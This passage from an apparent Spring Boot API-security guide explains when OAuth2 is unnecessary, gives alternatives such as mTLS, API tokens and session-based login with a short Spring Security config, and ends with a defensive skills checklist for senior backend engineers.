public List<User> getUsers() {
    return userRepository.findAll();
}
```

---

## 15. When NOT to Use OAuth2

### 15.1 Simple Single-User Internal Tools

**Scenario**: A CLI tool you use locally to query your production database.

OAuth2 is overhead. Use:
- A personal API token stored in `~/.config/mytool/token` with strict file permissions.
- mTLS with a personal certificate.
- SSH key-based auth.

### 15.2 Purely Internal Microservices with No User Context

**Scenario**: A background job that processes data. No user is involved.

Options:
- mTLS: Mutual certificate authentication — strong, no token management.
- Static shared secret: Acceptable if network is fully trusted and secret is managed properly.
- Client Credentials: If you already have an OAuth2 infrastructure, use it for consistency.

OAuth2 Client Credentials is fine here, but mTLS or network policies (service mesh like Istio) may be simpler operationally.

### 15.3 Simple Server-Rendered Apps with Session-Based Auth

**Scenario**: A traditional server-rendered web app (Thymeleaf/JSP) with its own user database.

Spring Security's form-based session authentication is perfectly appropriate. No need for JWT or OAuth2.

```java
http
    .formLogin(form -> form.loginPage("/login"))
    .sessionManagement(session -> session
        .maximumSessions(1) // Prevent concurrent logins
        .maxSessionsPreventsLogin(false) // Kick old session
    )
    .rememberMe(remember -> remember
        .tokenValiditySeconds(86400)
        .key("uniqueAndSecretKey")
    );
```

### 15.4 Small Teams with Full Infrastructure Control

If you control all the clients, all the servers, all the networks, and there are 5 engineers:
- OAuth2 adds complexity.
- Simpler alternatives: mutual TLS, API keys with expiry, basic auth over TLS.

**The real question**: Are you delegating authorization to third parties, or enabling SSO? If no: you may not need OAuth2.

---

## 16. Final Checklist

### You are a senior-level API security engineer if you can:

#### Foundations
- [ ] Explain the difference between authentication and authorization with concrete examples, without looking it up.
- [ ] Draw the OAuth 2.0 Authorization Code + PKCE flow from memory, including every HTTP request and response.
- [ ] Explain why the `alg: none` JWT attack works and how to prevent it.
- [ ] Describe the difference between ID Token and Access Token, and explain why mixing them up is dangerous.
- [ ] List the claims a Resource Server MUST validate on every JWT and explain why each one matters.

#### Architecture
- [ ] Design a token strategy (access/refresh expiry, storage, rotation) for a mobile app, a web SPA, and a microservice, explaining the trade-offs of each.
- [ ] Explain how to revoke JWTs immediately without breaking statelessness.
- [ ] Describe Zero Trust architecture and how service-to-service auth works in it.
- [ ] Design multi-tenant API security where tenant isolation is enforced at every layer.
- [ ] Explain when to use OAuth2 and when simpler alternatives (API keys, mTLS) are better.

#### Implementation
- [ ] Write Spring Boot configuration for a Resource Server that validates Keycloak JWTs with issuer and audience validation.
- [ ] Implement a custom `JwtAuthenticationConverter` that maps Keycloak realm roles to Spring Security authorities.
- [ ] Configure a Spring Boot service to call another protected service using Client Credentials.
- [ ] Implement refresh token rotation with replay attack detection.
- [ ] Write method-level security with `@PreAuthorize` that checks both roles and resource ownership.

#### Attacks & Defense
- [ ] Identify BOLA/IDOR vulnerabilities in code review and write the fix.
- [ ] Explain CSRF and why it doesn't affect Bearer token APIs but does affect cookie-based auth.
- [ ] Explain why `localStorage` is dangerous for token storage and what to use instead.
- [ ] Walk through a token replay attack and implement the `jti` denylist defense.
- [ ] Find the security bug in a given JWT validation implementation.

#### Operations
- [ ] Debug a `403 Forbidden` in a Spring Boot service by tracing from JWT claims through `JwtAuthenticationConverter` to `@PreAuthorize` evaluation.
- [ ] Perform zero-downtime signing key rotation in Keycloak without invalidating existing tokens.
- [ ] Set up audit logging for authentication events that doesn't expose sensitive data.
- [ ] Configure alerts for common security anomalies (auth failure spikes, token replay attempts).
- [ ] Use the JWKS endpoint to verify a JWT signature manually with curl and openssl.

---

*Built for the senior Java backend engineer who ships secure systems — not the engineer who passes a compliance checkbox.*
